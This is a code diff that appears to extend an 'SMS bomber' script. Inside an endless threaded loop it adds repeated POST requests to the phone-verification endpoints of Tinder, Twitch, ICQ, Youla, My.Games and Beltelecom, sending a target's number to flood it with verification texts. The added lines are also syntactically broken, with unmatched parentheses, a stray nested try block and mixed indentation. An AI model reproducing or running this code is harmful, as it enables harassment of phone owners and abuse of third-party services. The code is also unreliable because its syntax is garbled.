@@ -500,5 +500,54 @@ def infinity():
 		except:
 			print('[✖] Failed !')
 
+		try:
+			requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
+			print('[✔] Successful')
+		except:
+			print('[✖] Failed !')
+
+		try:
+			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus}))
+			print('[✔] Successful')
+		except:
+			  print('[✖] Failed !')
+			
+		try:
+			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num)))
+			print('[✔] Successful')
+		except:
+			print('[✖] Failed !')
+
+		try:
+			requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone}))
+			print('[✔] Successful')
+		except:
+			print('[✖] Failed !')
+
+		try:
+			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}))
+			print('[✔] Successful')
+		except:
+			print('[✖] Failed !')
+
+		try:
+			
+                try:
+                        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}))
+    			print('[✔] Successful')
+		except:
+			print('[✖] Failed !')
+
+		try:
+			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}))			print('[✔] Successful')
+		except:
+			print('[✖] Failed !')
+
+		try:
+			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}))
+                 	print('[✔] Successful')
+		except:
+			print('[✖] Failed !')
+
 countT = Thread(target=infinity)
 countT.start()
